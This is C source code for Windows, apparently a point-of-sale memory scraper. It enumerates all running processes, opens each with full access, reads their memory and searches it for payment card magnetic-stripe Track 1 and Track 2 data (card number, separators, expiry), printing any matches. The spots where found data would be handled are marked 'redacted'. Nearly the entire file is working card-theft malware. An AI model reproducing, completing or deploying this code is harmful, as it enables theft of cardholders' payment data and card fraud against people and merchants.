/*
* goto's are bad hrmm ok! i dont honestly care this was so long ago lmfao
*/
#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <TlHelp32.h>
#define MIN(a,b) (((a)<(b))?(a):(b))

#define SCAN_SIZE (1024 * 1024) 
BOOL SearchTrackOne(LPCSTR lpBuf, DWORD dwBuf, LPSTR *lpszDest) {
	BOOL status = FALSE;
	BOOL bFoundStartSentinel = FALSE, bFormatCode = FALSE, bPan = FALSE, bFirstFieldSeperator = FALSE, bSecondFieldSeperator = FALSE, bEndSentinel = FALSE;
	DWORD dwIndex = 0, dwEnd = 0, dwPan = 0;
	while (dwIndex < dwBuf)
	{

		char c = lpBuf[dwIndex];
		if (!bFoundStartSentinel) {
			if (c == '%') {
				bFoundStartSentinel = TRUE;
				goto next_iteration;
			}
			goto reset_values;
		}
		if (!bFormatCode) {
			if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')) {
				bFormatCode = TRUE;
				goto next_iteration;
			}
			goto reset_values;
		}
		if (!bPan) {
			if (c >= '0' && c <= '9') {
				dwPan++;
				if (dwPan == 16) {
					bPan = TRUE;
				}
				goto next_iteration;
			}

			goto reset_values;
		}
		if (!bFirstFieldSeperator) {
			if (c == '^')
			{
				bFirstFieldSeperator = TRUE;
			}

			goto next_iteration;
		}
		if (!bSecondFieldSeperator) {
			if (c == '^') {
				bSecondFieldSeperator = TRUE;
			}
			goto next_iteration;
		}
		if (!bEndSentinel) {
			if (c == '?') {
				goto found_track;
			}
			goto next_iteration;
		}
	found_track:
		bEndSentinel = TRUE;
		status = TRUE;
		dwIndex++;
		dwEnd++;
		break;

	reset_values:
		dwEnd = 0;
		dwPan = 0;
		bFoundStartSentinel = FALSE;
		bFormatCode = FALSE;
		bPan = FALSE;
		bFirstFieldSeperator = FALSE;
		bSecondFieldSeperator = FALSE;
	next_iteration:
		dwIndex++;
		dwEnd++;

	}
	if (status) {
		*lpszDest = HeapAlloc(GetProcessHeap(), 0, dwEnd + 1);
		RtlZeroMemory(*lpszDest, dwEnd + 1);
		memcpy(*lpszDest, lpBuf + (dwIndex - dwEnd) + 1, dwEnd);
		printf("we might have found a track2? \n\n\n\n%s\n\n\n\n", *lpszDest);
		
	}
	return status;
}

BOOL SearchTrackTwo(LPCSTR lpBuf, DWORD dwBuf, LPSTR *lpszDest) {
	BOOL status = FALSE;
	BOOL bStartSentinel = FALSE, bCard = FALSE, bFieldSeparator = FALSE, bExp = FALSE, bEndSentinel = FALSE;
	DWORD dwIndex = 0, dwEnd = 0, dwCard = 0, dwExp = 0;;
	while (dwIndex < dwBuf) {
		char c = lpBuf[dwIndex];
		if (!bStartSentinel) {
			if (c == ';')
			{
				bStartSentinel = TRUE;
				goto next_iteration;
			}
			goto reset_values;
		}
		if (!bCard) {
			if (c >= '0' && c <= '9') {
				dwCard++;
				if (dwCard == 16) {
					bCard = TRUE;
				}
				goto next_iteration;
			}
			goto reset_values;
		}
		if (!bFieldSeparator) {
			if (c == '=') {
				bFieldSeparator = TRUE;
				goto next_iteration;
			}
			goto reset_values;

		}
		if (!bExp) {
			if (c >= '0' && c <= '9') {
				dwExp++;
				if (dwExp == 4) {
					bExp = TRUE;
				}
				goto next_iteration;
			}
			goto reset_values;
		}

		if (!bEndSentinel) {
			if (c == '?') {
				goto found_track;
			}
			goto next_iteration;
		}
	found_track:
		bEndSentinel = TRUE;
		status = TRUE;
		dwIndex++;
		dwEnd++;
		break;

	reset_values:
		dwEnd = 0;
		dwCard = 0;
		dwExp = 0;
		bCard = FALSE;
		bStartSentinel = FALSE;
		bFieldSeparator = FALSE;
		bExp = FALSE;
	next_iteration:
		dwIndex++;
		dwEnd++;
	}
	if (status) {
		*lpszDest = HeapAlloc(GetProcessHeap(), 0, dwEnd + 1);
		RtlZeroMemory(*lpszDest, dwEnd + 1);
		memcpy(*lpszDest, lpBuf + (dwIndex - dwEnd) + 1, dwEnd);
		printf("we might have found a track1? \n\n\n\n%s\n\n\n\n", *lpszDest);
	}
	return status;
}

DWORD GetModuleBase(WCHAR *lpModuleName, DWORD dwProcessId)
{
	MODULEENTRY32 lpModuleEntry = { 0 };
	BOOL bModule;
	HANDLE hSnapShot;

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessId);

	if (!hSnapShot)
		return 0;

	lpModuleEntry.dwSize = sizeof(lpModuleEntry);
	bModule = Module32First(hSnapShot, &lpModuleEntry);

	while (bModule)
	{
		if (!wcscmp(lpModuleEntry.szModule, lpModuleName))
		{
			CloseHandle(hSnapShot);
			return (DWORD)lpModuleEntry.modBaseAddr;
		}
		bModule = Module32Next(hSnapShot, &lpModuleEntry);
	}
	CloseHandle(hSnapShot);

	return 0;
}

BOOL FindTracks(HANDLE hProcess, DWORD lpAddress) {
	BOOL status = FALSE;
	DWORD lpMemoryAddress = lpAddress;
	MEMORY_BASIC_INFORMATION MBI = { 0 };
	SYSTEM_INFO SysInfo = { 0 };
	GetSystemInfo(&SysInfo);

	while (lpMemoryAddress < SysInfo.lpMaximumApplicationAddress) {
		//puts("while loop");
		VirtualQueryEx(hProcess, (LPCVOID)lpMemoryAddress, &MBI, sizeof(MEMORY_BASIC_INFORMATION));
		DWORD dwScanSizeCurrent = lpMemoryAddress;
		DWORD dwScanSize = 0;
		while (1) {
			dwScanSize = ((DWORD)MBI.BaseAddress + MBI.RegionSize) - dwScanSizeCurrent;
			dwScanSize = MIN(dwScanSize, SCAN_SIZE);
			if (dwScanSize <= 0) {
				status = FALSE;

				break;
			}
			PCHAR lpszMemory = HeapAlloc(GetProcessHeap(), 0, dwScanSize);
			DWORD dwBytesRead = 0;
			if (!lpszMemory) {
				status = FALSE;

				//
				break;
			}
			if (MBI.Protect == PAGE_READWRITE || MBI.Protect == PAGE_READONLY || MBI.Protect == PAGE_EXECUTE_WRITECOPY || MBI.Protect == PAGE_EXECUTE_READWRITE
				|| MBI.Protect == PAGE_EXECUTE_READ) {
				if (ReadProcessMemory(hProcess, lpMemoryAddress, lpszMemory, dwScanSize, &dwBytesRead)) {
					LPSTR lpszDest = NULL;
					if (SearchTrackOne(lpszMemory, dwScanSize, &lpszDest)) {
						// redacted
						HeapFree(GetProcessHeap(), 0, lpszDest);
						lpszDest = NULL;
					}

					if (SearchTrackTwo(lpszMemory, dwScanSize, &lpszDest)) {
						//redacted 
						HeapFree(GetProcessHeap(), 0, lpszDest);
					}

					dwScanSizeCurrent += dwBytesRead;
				}
				else {
					dwScanSizeCurrent += dwScanSize;
				}
			}
			else {
				dwScanSizeCurrent += dwScanSize;
			}

			HeapFree(GetProcessHeap(), 0, lpszMemory);
		}
		lpMemoryAddress = ((DWORD)MBI.BaseAddress + MBI.RegionSize);
		status = TRUE;
	}
	return status;
}
BOOL ScanForTracks() {
	//

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &entry) == TRUE) {
		do {
			HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);

			if (hp) {
				DWORD dwAddress = GetModuleBase(entry.szExeFile, entry.th32ProcessID);
				if (dwAddress != 0)
					FindTracks(hp, dwAddress);
				CloseHandle(hp);
			}

		} while (Process32Next(snapshot, &entry) == TRUE);
	}

	return TRUE;
}
